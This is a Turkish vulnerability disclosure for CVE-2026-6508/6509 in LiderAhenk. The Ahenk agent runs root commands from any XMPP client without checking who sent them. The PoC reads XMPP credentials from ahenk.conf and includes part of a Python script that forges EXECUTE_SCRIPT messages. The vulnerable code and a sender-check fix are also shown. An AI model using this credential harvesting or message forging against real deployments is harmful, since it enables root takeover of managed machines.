# CVE-2026-6508 && CVE-2026-6509
EvilAhenk, LiderAhenk Merkezi Yönetim Sistemi mimarisinde, uç birimler (agents) arası tüm istemcilerin birbirleri üzerinde 'root' yetkisiyle kod çalıştırılmasına (Unauthorized RCE & Lateral Movement) olanak tanıyan kritik güvenlik zafiyetidir.

## Sistem Nasıl Çalışır
LiderAhenk'te yönetim paneli/merkez sunucu, istemcilere XMPP üzerinden görev ve politika mesajları yollar.

- Merkez Yönetim Paneli yetkili kullanıcı ile XMPP sunucusuna bağlanır,
- İstemcilerdeki `ahenk` agent'ları da aynı XMPP altyapısına bağlanır,
- Merkez, hedef istemciye `EXECUTE_POLICY`, `EXECUTE_TASK` veya `EXECUTE_SCRIPT` gibi mesajlar yollar
- İstemci agent, bu mesajları alıp uygular

Yani XMPP burada yönetim trafiğinin taşıma kanalıdır. Merkez panelin komutları normalde bu kanal üzerinden istemcilere gider.

## Beklenen akış ve zafiyetli akış farkı

Beklenen akış:

```text
Lider/Ahenk yonetim paneli -> XMPP sunucusu -> hedef agent
```

Zafiyetli akış:

- `ct-2`, aynı XMPP sunucusuna bağlı geçerli bir istemcidir
- `ct-2`, `ct-1` JID'ini hedefleyerek XMPP server üzerinden `EXECUTE_SCRIPT` mesajı yollar
- XMPP sunucusu mesajı `ct-1`'e iletir
- `ct-1`, mesajın gerçekten `lider_sunucu`dan gelip gelmediğini kontrol etmeden komutu çalıştırır
- Komut root olarak çalışır çünkü `ahenk.service` root olarak çalışır

```text
ct-2 veya baska bir XMPP hesabi -> XMPP sunucusu -> ct-1 agent -> root komut
```

Yani biz XMPP katmanını hacklemiyoruz. XMPP sunucusu normal mesaj yönlendirme yapıyor. Sorun, `ct-1` tarafındaki Ahenk agent'inin gelen mesajın gerçekten yetkili yönetim hesabından gelip gelmediğini kontrol etmemesi.

## PoC

```
pip install slixmpp
```

Ele geçirilmiş ve merkezi yönetim sistemine bağlı bir client üzerinden aşağıdaki gibi bilgiler toplanır:

```bash
sudo grep -E '^(uid|password|host|port|servicename|receiverjid|use_tls)' /etc/ahenk/ahenk.conf
```

Örnek Çıktı;

```bash
uid = pardus-ct-2
password = e0c5a52e-36c2-31fc-ad0b-e9ceabbf3401
host = 192.168.100.13
port = 5222
use_tls = false
receiverjid = lider_sunucu
servicename = im.liderahenk.org
```

Main.py dosyasını aldığımız bilgilere göre güncelliyoruz, im.liderahenk.org domain, pardus-ct-1 hedef uid

```
- XMPP user: `pardus-ct-2@im.liderahenk.org`
- XMPP password: `e0c5a52e-36c2-31fc-ad0b-e9ceabbf3401`
- XMPP host: `192.168.100.13`
- XMPP port: `5222`
- Varsayilan hedef: `pardus-ct-1@im.liderahenk.org`
```

Kurban makinede çalıştırılacak komut COMMAND değişkeni değiştirilerek düzenlenebilir.
```py
root@pardus-ct-2:/home/pardus-ct-2# cat xp.py | head -n 11
#!/usr/bin/env python3
import asyncio
import json
from slixmpp import ClientXMPP

XMPP_USER = "pardus-ct-2@im.liderahenk.org"
XMPP_PASS = "e0c5a52e-36c2-31fc-ad0b-e9ceabbf3401"
TARGET_JID = "pardus-ct-1@im.liderahenk.org"
XMPP_HOST = "192.168.100.13"
XMPP_PORT = 5222
COMMAND = "id > /tmp/who; false"
```

## Zafiyetli kod
`repos/ahenk/src/base/messaging/messenger.py` içinde gelen mesaj sadece `type` alanına göre işleniyor. `msg['from']` için yetkili gönderici kontrolü yok:

```p
def recv_direct_message(self, msg):
    if msg['type'] in ['normal']:
        j = json.loads(str(msg['body']))
        message_type = j['type']
        self.event_manger.fireEvent(message_type, str(msg['body']))
```

`repos/ahenk/src/base/execution/execution_manager.py` içinde ise `EXECUTE_SCRIPT` doğrudan komut çalıştırmaya gidiyor:

```python
def execute_script(self, arg):
    json_data = json.loads(arg)
    result_code, p_out, p_err = Util.execute(str(json_data['command']))
```

Bu iki parça birleşince etkisi şu oluyor:
- XMPP sunucusu mesajı hedefe iletiyor
- Kurban agent göndereni doğrulamadan `EXECUTE_SCRIPT` event'ini tetikliyor
- Komut root olarak çalışıyor

Olabilecek tasarımsal fix;

```python
def recv_direct_message(self, msg):
    if msg['type'] != 'normal':
        return

    allowed_sender = self.receiver.split('/')[0]
    actual_sender = msg['from'].bare
    if actual_sender != allowed_sender:
        self.logger.warning("Rejected message from %s", actual_sender)
        return

    j = json.loads(str(msg['body']))
    self.event_manger.fireEvent(j['type'], str(msg['body']))
```
